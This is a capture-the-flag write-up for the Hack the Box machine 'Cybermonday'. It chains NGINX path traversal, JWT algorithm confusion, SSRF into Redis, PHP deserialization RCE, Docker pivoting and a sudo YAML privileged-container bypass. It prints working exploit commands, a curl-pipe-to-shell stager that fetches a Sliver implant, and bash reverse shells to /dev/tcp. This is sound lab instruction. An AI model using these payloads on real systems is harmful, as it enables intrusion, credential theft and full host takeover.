---
title: "HTB • Cybermonday"
tags:
  - "Expert"
  - "Linux"
  - "Hard Difficulty"
  - "Web"
  - "Redis"
  - "PHP"
  - "Deserialization"
  - "Path Traversal"
  - "JWT"
  - "Cryptography"
  - "Code Review"
  - "Docker"
  - "Sudo"
  - "Python"
  - "SSRF"
  - "YAML"
  - "API"
  - "Pivoting"
  - "Command & Control"
excerpt: "Cybermonday is a hard Linux machine on Hack the Box that involves path traversal, PHP and Python code review, JSON Web Tokens (JWTs), Server Side Request Forgery (SSRF), Docker, pivoting, and much more!"
categories:
  - "Writeups"
  - "Hack the Box Machines"
img_path: "/assets/img/post/htb-machines-cybermonday/"
---


Cybermonday is a hard Linux-based [**Hack the Box**](https://app.hackthebox.com/machines/Cybermonday) machine created by [**Tr1s0n**](https://app.hackthebox.com/users/575442). We initially found a web server with a common NGINX misconfiguration allowing us to leak the source code. On further review of the PHP source, an access control issue was discovered allowing us to upgrade standard web accounts to admin accounts. From the admin dashboard, we found a reference to an API that was vulnerable to JSON Web Token (JWT) algorithm confusion, allowing us to craft privileged JWTs and access administrative routes. One of these routes was used to write keys on a backend Redis server via SSRF, and cause RCE from PHP session deserialization. From inside a Docker container, we contacted an internal Docker registry to download the image associated with the API, and discovered a path traversal vulnerability which enabled us to recover the password for a host OS user. Now on the host machine, a rule in the Sudo policy allowed for the exploitation of a Python script to start a privilege Docker container. We mounted the host filesystem in this container and recovered the root flag.


## Initial Recon

We began by setting up our environment and conducting a port scan using a [custom nmap wrapper script](https://github.com/bryanmcnulty/ctf-scripts/blob/main/recon/active/ctf-portscan.sh). This script aids in quickly and reliably scanning for open ports on the target.

~~~zsh
# Set up environment variables and run a port scan
echo rhost="10.10.11.228" >> ./.ctf # Add machine IP address
echo lhost="10.10.14.2" >> ./.ctf # Add our VPN IP address
. ./.ctf
ctfscan $rhost
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

The scan reported a total of two open ports:

| State | Transport | Port | Protocol | Product | Version                 |
|:------|:----------|:-----|:---------|:--------|-------------------------|
| Open  | TCP       | 22   | SSH      | OpenSSH | 8.4p1 Debian 5+deb11u1  |
| Open  | TCP       | 80   | HTTP     | nginx   | 1.25.1                  |


## Web

Our initial request to <http://10.10.11.228> was answered with a redirect to <http://cybermonday.htb>. The hostname **cybermonday.htb** was added to `/etc/hosts`{:.filepath} for easy access from a web browser. We also quickly fingerprinted the web app with [Wappalyzer](https://www.npmjs.com/package/wappalyzer/v/6.10.66), and found **PHP 8.1.20** in use.

~~~zsh
# Send GET request to http://10.10.11.228
curl -i "http://$rhost"

# Add hostname "cybermonday.htb" to environment + /etc/hosts
echo "vhost=(cybermonday.htb)" >> ./.ctf && . ./.ctf
echo -e "$rhost\t${vhost[@]}" | sudo tee -a /etc/hosts

# Attempt to fingerprint cybermonday.htb:80
wappalyzer "http://cybermonday.htb" | tee ./logs/wappalyzer-cybermonday_htb.json

# Display versions
jq '.technologies[]|[.name,.version]' ./logs/wappalyzer-cybermonday_htb.json
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}


### Application Review

We visited <http://cybermonday.htb> in BurpSuite's built-in Chromium browser and began to browse.

![Web index](web-index.png)
_cybermonday.htb web index_

Both a login and registration page were found, so we registered an account at [/signup](http://cybermonday.htb/signup), and logged in at [/login](http://cybermonday.htb/login) to access additional profile functionality.

![Login page](web-auth-login.png)
_cybermonday.htb account login page_

![User registration page](web-auth-signup.png)
_cybermonday.htb account registration page_


### Off-By-Slash Path Traversal

We noticed that the site pulls static resources from the `/assets`{:.filepath} directory, so we observed the difference between 404 responses when requesting nonexistent paths with and without the prefix `/assets`{:.filepath} to better understand how NGINX is handling those paths.

~~~zsh
# Request nonexistent page WITHOUT "/assets" prefix
curl -I "http://cybermonday.htb/Q2tAab/_" # 404, nginx header + PHP "X-Powered-By"

# Request nonexistent page WITH "/assets" prefix
curl -I "http://cybermonday.htb/assets/_" # 404, only nginx server header
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

Nonexistent paths _without_ the `/assets`{:.filepath} prefix triggered a response with the `X-Powered-By: PHP/8.1.20` header, meaning that they were being processed by PHP. Paths _with_ the prefix did not return the header created by PHP likely because the request was directly communicating with NGINX. This is likely the work of an NGINX alias, which are often misconfigured. We ran some additional checks to look for a common misconfiguration known as [NGINX off-by-slash path traversal](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/).

~~~zsh
# Test for NGINX off-by-slash misconfigured alias
curl -I "http://cybermonday.htb/assets.." # HTTP 301 ~> Likely vulnerable
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

The target appeared to be vulnerable! We began to locate files or directories that might be included at the root of a PHP project, and ended up finding a `.git`{:.filepath} folder, which was used to recover the Git repository with [git-dumper](https://pypi.org/project/git-dumper/). We also downloaded `.env`{:.filepath}, which was listed in `.gitignore`{:.filepath} and therefore excluded from the repository.

~~~zsh
# Check for .git folder
curl -I "http://cybermonday.htb/assets../.git" # HTTP 301 ~> folder exists

# Dump Git repository
git-dumper "http://cybermonday.htb/assets../.git" ./cybermonday.git

# Download .env from project root
curl "http://cybermonday.htb/assets../.env" -so ./cybermonday.git/.env
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

Before reviewing the actual code, we took a look at `.env`{:.filepath} and found an encryption key presumably used to encrypt, decrypt, or validate sessions. We also learned that the app was using a Redis key-value store at **redis:6379** to manage sessions in keys with the `laravel_session:` prefix.

~~~text
APP_NAME=CyberMonday
APP_ENV=local
APP_KEY=base64:EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA=
APP_DEBUG=true
APP_URL=http://cybermonday.htb
...

REDIS_HOST=redis
REDIS_PASSWORD=
REDIS_PORT=6379
REDIS_PREFIX=laravel_session:
CACHE_PREFIX=
...
~~~
{:file=".env" .nolineno}

The source appears to use the default structure of Laravel projects defined in [Laravel's documentation](https://laravel.com/docs/10.x/structure). According to this standard, the core user-defined code should be stored in the `app`{:.filepath} directory.


### Broken Access Control

A single user property called `isAdmin`, referenced in `app/Http/Middleware/AuthenticateAdmin.php`{:.filepath}, dictates whether a session is granted access to administrative routes. After some testing on the endpoints available to standard users, we found that the property could be altered when updating our profile with a JSON request body.

~~~http
POST /home/update HTTP/1.1
Host: cybermonday.htb
Content-Length: 120
Accept: */*
Cookie: XSRF-TOKEN=...; cybermonday_session=...
Content-Type: application/json;charset=UTF-8

{
  "_token":"...",
  "username":"HTB-zVYmCf",
  "email":"zVYmCf@htb.local",
  "isAdmin": true
}
~~~
{:.nolineno}

We now have access to the admin dashboard at [/dashboard](http://cybermonday.htb/dashboard) as well as the "Products" and "Changelog" pages referenced on the dashboard.

![Admin dashboard](web-admin-dashboard.png)
_Admin dashboard on cybermonday.htb_

The changelog in particular includes some interesting information regarding changes made to the application and references a webhook used to create registration logs at <http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77>.

![Web changelog](web-admin-dashboard-changelog.png)
_Administrative changelog on cybermonday.htb_


### Webhook API

We added the hostname **webhooks-api-beta.cybermonday.htb** to `/etc/hosts`{:.filepath} to easily access the intended virtual host. An API schema was found at [the web index](http://webhooks-api-beta.cybermonday.htb/) detailing six distinct routes.

~~~zsh
# Add virtual hostname to /etc/hosts
echo -e "$rhost\twebhooks-api-beta.cybermonday.htb" | sudo tee -a /etc/hosts
echo 'webhooks_api=http://webhooks-api-beta.cybermonday.htb' >> ./.ctf && . ./.ctf

# Download webhook API routes
curl -s http://webhooks-api-beta.cybermonday.htb/ | jq .message.routes > ./routes.json
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

~~~json
{
  "/auth/register": {
    "method": "POST",
    "params": ["username", "password"]
  },
  "/auth/login": {
    "method": "POST",
    "params": ["username", "password"]
  },
  "/webhooks": {
    "method": "GET"
  },
  "/webhooks/create": {
    "method": "POST",
    "params": ["name", "description", "action"]
  },
  "/webhooks/delete:uuid": {
    "method": "DELETE"
  },
  "/webhooks/:uuid": {
    "method": "POST",
    "actions": {
      "sendRequest": {
        "params": ["url", "method"]
      },
      "createLogFile": {
        "params": ["log_name", "log_content"]
      }
    }
  }
}
~~~
{:file="routes.json" .nolineno}

The **sendRequest** action looked like it could easily lead to SSRF, so we tried using `/webhooks/create`{:.filepath} to create a new webhook with **sendRequest** and found that we needed to authenticate. We proceeded to create an account at `/auth/register`{:.filepath} and authenticate at `/auth/login`{:.filepath}.

~~~zsh
# Try accessing the webhook from changelog
curl -i -XPOST "$webhooks_api/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77" # missing key

# Try to create a new webhook with sendRequest
curl -i $webhooks_api/webhooks/create \
  -H 'Content-Type: application/json' \
  -d '{"name":"KmCu","description":"d0Ik","action":"sendRequest"}' # "Unauthorized"

# Register an account + login
username='HTB-IrLGdg'
password='hIC8CZNMjr2VuQV0Al'
curl $webhooks_api/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"'"$username"'","password":"'"$password"'"}' # "success"
curl $webhooks_api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"'"$username"'","password":"'"$password"'"}' # Got access token
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

~~~json
{"status":"success","message":{"x-access-token":"eyJ0..."}}
~~~
{:file="STDOUT" .nolineno}

A JSON Web Token (JWT) was returned in the **x-access-token** field, likely referring to the header it should be supplied in. With this JWT, we gained access to the `/webhooks`{:.filepath} route, but did not find any new webhooks listed. We also found that `/webhooks/create`{:.filepath} was still off-limits.

~~~zsh
# List webhooks
token="..." # Token from the successful login response
curl $webhooks_api/webhooks -H "x-access-token: $token" # No new webhooks :(

# Try to create a new webhook with sendRequest (authenticated)
curl -i $webhooks_api/webhooks/create \
  -H 'Content-Type: application/json' -H "x-access-token: $token" \
  -d '{"name":"KmCu","description":"d0Ik","action":"sendRequest"}' # still "Unauthorized"
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}


#### JSON Web Tokens

We sent an authenticated request through our local BurpSuite proxy, copied it to Repeater, and began looking for security holes in the JWT implementation using BurpSuite's [JWT Editor extension](https://github.com/portswigger/jwt-editor).

~~~zsh
# Send request through local BurpSuite proxy
burp_proxy="http://127.0.0.1:8080"
curl -sx $burp_proxy "$webhooks_api/webhooks" -H "x-access-token: $token"
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

![Webhooks API request in BurpSuite Repeater](web-api-burp.png)
_Authenticated API request in BurpSuite Repeater_

![Webhooks API request in BurpSuite JWT Editor](web-api-burp-jwt-editor.png)
_Authenticated API request with JWT Editor view_

The JWT was signed using the **RS256** algorithm (RSA) as defined in the _alg_ field. There's a common vulnerability found in JWT processing mechanisms using RSA called [algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion). We needed the RSA public key to test for this, so we quickly retrieved it from a common location [/jwks.json](http://webhooks-api-beta.cybermonday.htb/jwks.json).

~~~zsh
# Download JSON Web Keys (JWKs)
curl "$webhooks_api/jwks.json" -O

# Print key with "kid" (required by JWT Editor)
jq '.keys[0]|.kid="pwn"' ./jwks.json
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

~~~json
{
  "kty": "RSA",
  "use": "sig",
  "alg": "RS256",
  "n": "pvezvAKCOgxwsiyV6PRJfGMul-WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP_8jJ7WA2gDa8oP3N2J8zFyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn797IlIYr6Wqfc6ZPn1nsEhOrwO-qSD4Q24FVYeUxsn7pJ0oOWHPD-qtC5q3BR2M_SxBrxXh9vqcNBB3ZRRA0H0FDdV6Lp_8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhngysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh16w",
  "e": "AQAB",
  "kid": "pwn"
}
~~~
{:file="STDOUT" .nolineno}

We opened up the Keys tab under JWT Editor, selected "New RSA Key" and added the JWK object.

![JWT Editor - RSA Key](web-api-burp-jwt-editor-rsa-key.png)
_Import signing key from JWK_

From here we navigated back to the Repeater tab, selected the JSON Web Token view, and edited the payload's _role_ key to "admin". We clicked **Attack ➤ HMAC Key Confusion** and used the imported key and **HS256** algorithm when prompted to select a signing key and algorithm.

![JWT Editor - modified JWT](web-api-burp-jwt-editor-modification.png)
_Modified JWT in the "JWT Editor" view_
![JWT Editor - HMAC key confusion](web-api-burp-jwt-editor-attack.png)
_Conduct HMAC key confusion attack_

We sent the request with the new JWT to `/webhooks`{:.filepath} and found that our edited JWT is valid! This means that the privileged JWT was accepted by the server.

![Webhooks API request with edited JWT](web-api-burp-jwt-editor-validated.png)
_Response indicating a valid JWT_

Finally, we could create a new webhook at `/webhooks/create`{:.filepath} using the privileged token. We created a webhook that implements **sendRequest**, and got a new UUID to access it.

![Create webhook with privileged JWT](web-api-burp-create-webhook.png)
_Create a new webhook to use "sendRequest"_


#### Server Side Request Forgery (SSRF)

We began testing the new webhook for SSRF and noticed that it sends requests to any URL using the HTTP wrapper, and the _method_ parameter accepts any string value, even with whitespace.

~~~zsh
# Start listener
socat TCP-LISTEN:8080,fork,reuseaddr,bind=$lhost -

# (In a separate tab) trigger SSRF
uuid="e7538116-6c9b-4af4-8cd0-e7410dd4b843" # The sendRequest webhook
curl $webhooks_api/webhooks/$uuid -H 'Content-Type: application/json' \
  -d '{"url":"http://'"$lhost"':8080","method":"DEMO\r\nX:"}' -so /dev/null
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

~~~text
DEMO
X: / HTTP/1.1
Host: 10.10.14.2:8080
Accept: */*
~~~
{:file="STDOUT" .nolineno}

We used this SSRF to contact the Redis store from the Laravel environment at **redis:6379**. To verify the blind interaction, our Laravel session on the main site was set to a blank string, then we confirmed that we were no longer authenticated. To recover the laravel session ID, we simply decrypted the session information from the "cybermonday_session" cookie, using the key we found earlier in `cybermonday.git/.env`{:.filepath}

![Decoded session object](web-burp-session-cookie.png)
_Decode the "cybermonday\_session" cookie with BurpSuite Inspector_

~~~zsh
# "iv" from cybermonday_session object
iv=$(echo "4ahET1XMUo4K13E5bm6NIw=="|base64 -d|xxd -p -c16)

# Key from .env
key=$(echo "EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA="|base64 -d|xxd -p -c32)

# "value" from decoded cybermonday_session cookie
cat << EOF | base64 -d > data.bin
Yyj5xpbX/anzgYqAsiDMwXm6HXflROxg
LyYvuA2oRtfjJJ/d+nR4Sx2/3Cziyb9m
YUsv7CdHhqUfs/l9OxmSTxd10Hp1GHNa
Re2WyYcNYkGuVgQb1FfaCxwPTupVAttL
EOF

# Decrypt the session information
session_info=$(openssl enc -d -aes-256-cbc -K $key -iv $iv -in ./data.bin)

# Session ID should be the second value
session_id=$(echo $session_info | cut -d\| -f2)

# Get redis key using REDIS_PREFIX from .env
REDIS_PREFIX="laravel_session:"
redis_key="${REDIS_PREFIX}${session_id}"
echo $redis_key

# Write to our session
curl -so /dev/null "$webhooks_api/webhooks/$uuid" -H 'Content-Type: application/json' \
  -d '{"url":"http://redis:6379","method":"MSET '"$redis_key ''"'\r\n"}'
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

~~~text
laravel_session:LkqHznYDBJZT4DWvZOx7JWCHF6IdKdy8i1tYl8Fs
~~~
{:file="STDOUT" .nolineno}

Now if we request [/home](http://cybermonday.htb/home) again with the matching session cookie, we should be redirected to the login page since our session is no longer valid.

![Verifying communication with redis server](web-burp-verify-redis.png)
_Check if session is still valid_


### Deserialization

Since we could control the serialized session data through SSRF to redis, we decided to try some PHP deserialization gadget chains created by [phpggc](https://github.com/ambionics/phpggc). we initially looked for Laravel RCE chains but could not find any matching the laravel version in use. Eventually we noticed that Monolog was being used as the logging driver for Laravel as defined in `config/loggin.php`{:.filepath}, and it had plenty of compatible gadgets chains.

~~~zsh
# Laravel gadgets are mostly incompatible :/
phpggc -l "Laravel"

# Many Monolog gadgets are supported through 2.x
phpggc -l "Monolog"
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

~~~text
Gadget Chains
-------------

NAME            VERSION                            TYPE            VECTOR        I    
Monolog/FW1     3.0.0 <= 3.1.0+                    File write      __destruct    *    
Monolog/RCE1    1.4.1 <= 1.6.0 1.17.2 <= 2.7.0+    RCE: Command    __destruct         
Monolog/RCE2    1.4.1 <= 2.7.0+                    RCE: Command    __destruct         
Monolog/RCE3    1.1.0 <= 1.10.0                    RCE: Command    __destruct         
Monolog/RCE4    ? <= 2.4.4+                        RCE: Command    __destruct    *    
Monolog/RCE5    1.25 <= 2.7.0+                     RCE: Command    __destruct         
Monolog/RCE6    1.10.0 <= 2.7.0+                   RCE: Command    __destruct         
Monolog/RCE7    1.10.0 <= 2.7.0+                   RCE: Command    __destruct    *    
Monolog/RCE8    3.0.0 <= 3.1.0+                    RCE: Command    __destruct    *    
Monolog/RCE9    3.0.0 <= 3.1.0+                    RCE: Command    __destruct    *
~~~
{:file="STDOUT" .nolineno}

We started with **Monolog/RCE1** because Monolog 2 appeared to be supported. We created a gadget chain to trigger a call to `system` with the command `sleep 5` to cause a five second response delay for detection purposes.

~~~zsh
# use -a/--ascii-strings to escape unprintable bytes
serial=$(phpggc "Monolog/RCE1" "system" "sleep 5" -a)

# Create valid JSON request body
data=$(echo {} | jq --arg k "$redis_key" --arg v "$serial" \
  '.url="http://redis:6379"|.method="'"MSET \"+\$k+\" '\"+\$v+\"'\"")

# Write session to redis via SSRF
curl $webhooks_api/webhooks/$uuid -H 'Content-Type: application/json' -d "$data"
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

We once again requested [/home](http://cybermonday.htb/home) under the corresponding session and noticed a response time of just over five seconds. This was a solid indication that our command was executed, so we created another payload to download and execute a [Sliver](https://github.com/BishopFox/sliver) implant.

~~~zsh
# Generate payload that will fetch a stager script
stage="https://$lhost/TdsJnG"
serial=$(phpggc "Monolog/RCE1" "system" "curl -k $stage|sh" -a)
data=$(echo {} | jq --arg k "$redis_key" --arg v "$serial" \
  '.url="http://redis:6379"|.method="'"MSET \"+\$k+\" '\"+\$v+\"'\"")

# Write to session once again
curl $webhooks_api/webhooks/$uuid -H 'Content-Type: application/json' -d "$data"
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

Before we triggered deserialization again we created a stage script, generated an implant, started an HTTPS listener to host the both files, and initialized the mTLS Command & Control channel.

~~~sh
cat << EOF > stage.sh
of=\$(mktemp /tmp/Nu5I4j.XXXXXX)
curl -k https://$lhost/BuhPQk -o \$of
sh -c "chmod +x \$of;\$of &"
EOF
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

~~~sh
mtls -L 10.10.14.2 -l 8443
generate -o linux -m 10.10.14.2:8443 -l -G -s implant.elf
websites add-content -w cybermonday -c implant.elf -p /BuhPQk
websites add-content -w cybermonday -c stage.sh -p /TdsJnG
https -L 10.10.14.2 -l 443 -w cybermonday
~~~
{:file="bryan@redteam ➤ sliver-client" .nolineno}

After repeating the request to trigger deserialization, we successfully establish an implant Session!

![Implant session established](sliver-foothold.png)
_Established Sliver implant as www-data_


## Docker

Judging by the hostname and presence of `/.dockerenv`{:.filepath}, we were confident that our implant session was in a Docker container. We found a Linux user named **john** in `/mnt/.ssh/authorized_keys`{:.filepath}, but couldn't find much else on the filesystem, so we began mapping the Docker network.

~~~sh
ifconfig
socks5 start -P 1080
~~~
{:file="bryan@redteam ➤ sliver-client ➤ www-data@070370e2cdc4" .nolineno}

~~~zsh
# Scan the 1000 most common TCP ports on 172.18.0.0/29
naabu -proxy localhost:1080 -timeout 1000 -host 172.18.0.0/29
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

~~~text
172.18.0.7:80
172.18.0.3:3306
172.18.0.1:80
172.18.0.1:22
172.18.0.2:5000
172.18.0.4:80
~~~
{:file="STDOUT" .nolineno}

Port **5000** on **172.18.0.2** looked interesting, so we forwarded it to localhost and began testing. A plain HTTP GET request verified that it was a HTTP server, but didn't return much else. We tried requesting a random path and found that this was a Docker registry from the `Docker-Distribution-Api-Version` header.

~~~sh
portfwd add -r 172.18.0.2:5000 -b 127.0.0.1:5000
~~~
{:file="bryan@redteam ➤ sliver-client ➤ www-data@070370e2cdc4" .nolineno}

~~~zsh
# Investigate 172.18.0.2:5000 through local port forward
curl -i localhost:5000 # Nothing interesting
curl -i localhost:5000/_ # "registry/2.0" ~> Docker registry
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}


### Docker Registry

The `/v2/_catalog`{:.filepath} endpoint was requested to list container images. We ended up finding a custom image called **cybermonday_api** which was likely tied to the webhook API. The filesystem layers were downloaded from the registry and searched for relevant content.

~~~zsh
# List images
curl -i http://localhost:5000/v2/_catalog

# Download manifest for cybermonday_api:latest
curl http://localhost:5000/v2/cybermonday_api/manifests/latest | tee latest.manifest

# Dump filesystem layers
mkdir blobs
for blob in $(jq -r ".fsLayers[].blobSum" ./latest.manifest | awk '!x[$0]++'); do
  curl "http://localhost:5000/v2/cybermonday_api/blobs/$blob" -o blobs/$blob.tgz
done

# Search through filesystem layers for relevant files
for f in $(ls blobs); do
  tar -tzf blobs/$f | egrep -i var/www >/dev/null | sed "s/^/$f /"
done | grep "app/"
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

A bunch of custom PHP application sources were found at `/var/www/html/app`{:.filepath} in `blobs/sha256:ced3ae14*.tgz`{:.filepath}. We began to look for important secrets or exploitable bugs within the API source.

~~~zsh
# Extract specific filesystem layer to new directory
mkdir ./cybermonday_api && cd ./cybermonday_api
tar -xzf ../blobs/sha256:ced3ae14*.tgz
cd ./var/www/html
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}


### API Code Review

We found out that `config.php`{:.filepath} gathers a few important variables from the environment including some database credentials that would be of interest to us.

~~~php
return [
    "dbhost" => getenv('DBHOST'),
    "dbname" => getenv('DBNAME'),
    "dbuser" => getenv('DBUSER'),
    "dbpass" => getenv('DBPASS')
];
~~~
{:file="config.php" .nolineno}

We also found that `app/routes/Router.php`{:.filepath} maps a previously unknown route, `POST /webhooks/:uuid/logs`, to the **LogsController** class. We took a look at `app/controllers/LogsController.php`{:.filepath} since this was new content. 


#### Local File Read

The **LogsController** class was affected by a bug allowing us to read local files. The "read" action appeared to look for `../`{:.filepath} sequences THEN removed spaces. Because of this, we could simply position a space between two characters to bypass that rule.

~~~php

$logPath = "/logs/{$webhook_find->name}/";

switch($this->data->action) {
  // ...
  case "read":
    $logName = $this->data->log_name;

    if(preg_match("/\.\.\//", $logName)) {
      return $this->response(["status" => "error", "message" => "This log does not exist"]);
    }
    $logName = str_replace(' ', '', $logName);

    if(stripos($logName, "log") === false) {
      return $this->response(["status" => "error", "message" => "This log does not exist"]);
    }
    if(!file_exists($logPath.$logName)) {
      return $this->response(["status" => "error", "message" => "This log does not exist"]);
    }
    $logContent = file_get_contents($logPath.$logName);
    return $this->response(["status" => "success", "message" => $logContent]);
}
~~~
{:file="app/controllers/LogsController.php" .nolineno}

To reach this functionality, an API key in the **X-Api-Key** header must be provided as specified in `app/helpers/Api.php`{:.filepath}. To pass the `stripos` call, the payload must contain the string "log" in the name of an existing directory. Finally, to pass the `file_exists` check, there should be at least one log stored by the webhook since `/logs/{UUID}/` is created after the first log. We created a shell function to simplify the reading of files.

~~~php
public function apiKeyAuth()
{
  $this->api_key = "22892e36-1770-11ee-be56-0242ac120002";

  if(!isset($_SERVER["HTTP_X_API_KEY"]) || empty($_SERVER["HTTP_X_API_KEY"]) || $_SERVER["HTTP_X_API_KEY"] != $this->api_key)
  {
    return $this->response(["status" => "error", "message" => "Unauthorized"], 403);
  }
}
~~~
{:file="app/helpers/Api.php" .nolineno}

~~~zsh
uuid="fda96d32-e8c8-4301-8fb3-c821a316cf77"
api_key="22892e36-1770-11ee-be56-0242ac120002"

# write a log to create $logPath directory
curl "$webhooks_api/webhooks/$uuid" -H "Content-Type: application/json" \
  -d '{"log_name":"x","log_content":"..."}'

# Shell function to read files 
cybermonday_api_read_file() {
  curl -s "$webhooks_api/webhooks/$uuid/logs" \
    -H "X-Api-Key: $api_key" -H "Content-Type: application/json" \
    -d '{"action":"read","log_name":". ./. ./logs/. ./'"${1}"'"}' |
      jq -r '.message'
}

# Test out the function
cybermonday_api_read_file "/etc/passwd"
# Read database connection variables from environment
cybermonday_api_read_file "/proc/self/environ" | tr \\0 \\n | sort -u
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

~~~text
DBHOST=db
DBNAME=webhooks_api
DBPASS=ngFfX2L71Nu
DBUSER=dbuser
~~~
{:file="STDOUT" .nolineno}

We successfully read the database connection information referenced in `config.php`{:.filepath} from the process environment variables at `/proc/self/environ`{:.filepath}. A shell was established on the host machine via SSH with the database password and the username "john", which was found earlier in `/mnt/.ssh/authorized_keys`{:.filepath} on the implant session.

~~~zsh
# Connect via SSH
ssh john@$rhost # use DBPASS value
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}


## Privilege Escalation

Now logged in as _john_, We noticed a special sudo exception to run a Python script at `/opt/secure_compose.py`{:.filepath} as root with arguments matching `*.yml`.

~~~bash
# List sudo security policy
sudo -l
~~~
{:file="john@cybermonday ➤ bash" .nolineno}

~~~text
User john may run the following commands on localhost:
    (root) /opt/secure_compose.py *.yml
~~~
{:file="STDOUT" .nolineno}


### Docker Compose

The Python script at `/opt/secure_compose.py`{:.filepath} allowed us to start Docker containers using the command-line `docker-compose` utility, and implemented some checks for security purposes. One of these checks, `is_path_inside_whitelist`, should deny volumes outside of `/home/john`{:.filepath} or `/mnt`{:.filepath}. Another check, `check_no_symlinks`, should prevent the use of symbolic links to access files outside of those permitted folders.

~~~py
import sys, yaml, os, random, string, shutil, subprocess, signal

def get_user():
    return os.environ.get("SUDO_USER")

def is_path_inside_whitelist(path):
    whitelist = [f"/home/{get_user()}", "/mnt"]

    for allowed_path in whitelist:
        if os.path.abspath(path).startswith(os.path.abspath(allowed_path)):
            return True
    return False

def check_whitelist(volumes):
    for volume in volumes:
        parts = volume.split(":")
        if len(parts) == 3 and not is_path_inside_whitelist(parts[0]):
            return False
    return True

def check_read_only(volumes):
    for volume in volumes:
        if not volume.endswith(":ro"):
            return False
    return True

def check_no_symlinks(volumes):
    for volume in volumes:
        parts = volume.split(":")
        path = parts[0]
        if os.path.islink(path):
            return False
    return True

def check_no_privileged(services):
    for service, config in services.items():
        if "privileged" in config and config["privileged"] is True:
            return False
    return True
~~~
{:file="/opt/secure_compose.py" .nolineno}


#### Privileged Container Bypass

The `check_no_privileged` check was bypassed using a special YAML value `Y`, which is interpreted as _true_ by Docker's YAML parser while PyYAML interprets it as the string "Y". We created a YAML file that would start a privileged Docker container with the **cybermonday_api** image, then call a reverse shell from inside.

~~~yaml
# Privileged Container Bypass
version: "3.0"
services:
  privileged-bypass:
    image: "cybermonday_api" # We know that this one exists from earlier
    privileged: Y # PyYAML -> "Y"; Docker -> true
    command: ["bash","-c","bash -i>&/dev/tcp/10.10.14.2/8888<&1"] # 10.10.14.2 is our VPN address
~~~
{:file="privileged-bypass.yml"}

~~~zsh
# Upload our YAML exploit
scp ./privileged-bypass.yml john@$rhost:/tmp/privileged-bypass-OsE7Cu.yml

# Setup reverse shell listener
pwncat-cs -l $lhost 8888 # install PwnCat: `pip3 install pwncat-cs`
~~~
{:file="bryan@redteam ➤ zsh" .nolineno}

The device that stores the root filesystem was located at `/dev/sda1`{:.filepath} with the `findmnt` utility. We finally started the privileged container using the custom sudo policy, which triggered the reverse shell callback.

~~~bash
# List mounts in tree format
findmnt # ~> /dev/sda1 is the root filesystem partition

# Trigger reverse shell from privileged container
sudo /opt/secure_compose.py /tmp/privileged-bypass-OsE7Cu.yml
~~~
{:file="bryan@redteam ➤ ssh ➤ john@cybermonday ➤ bash" .nolineno}

From the reverse shell session, we mounted the host filesystem at `/mnt`{:.filepath} to gain full access. We then used `chroot` to switch to the mounted host filesystem, and finally read the root flag.

~~~bash
# Mount the host filesystem
mount /dev/sda1 /mnt

# Access the host filesystem + read the root flag
chroot /mnt bash
cat /root/root.txt
~~~
{:file="bryan@redteam ➤ pwncat-cs ➤ root@cde2f4ce2405 ➤ bash" .nolineno}


#### Restricted Volumes Bypass (Bonus)

The `check_no_symlinks` check could also be bypassed using a path _beyond_ a symbolic link. For example, to read a protected directory like `/root`{:.filepath} we created a link from `/`{:.filepath} to `/home/john/fs`{:.filepath}, then accessed `/root`{:.filepath} by adding `/home/john/fs/root`{:.filepath} as a volume.

~~~yaml
# Restricted Volumes Bypass
version: "3"
services:
  volumes-bypass:
    image: "cybermonday_api"
    volumes: ["/home/john/fs/root:/mnt/root:ro"]
    command: ["bash","-c","bash -i>&/dev/tcp/10.10.14.2/8888<&1"]
~~~
{:file="volumes-bypass.yml"}

~~~bash
ln -s / /home/john/fs
sudo /opt/secure_compose.py ./volumes-bypass.yml
~~~
{:file="bryan@redteam ➤ ssh ➤ john@cybermonday ➤ bash" .nolineno}

The root flag was once again read from `/mnt/root/root.txt`{:.filepath}.
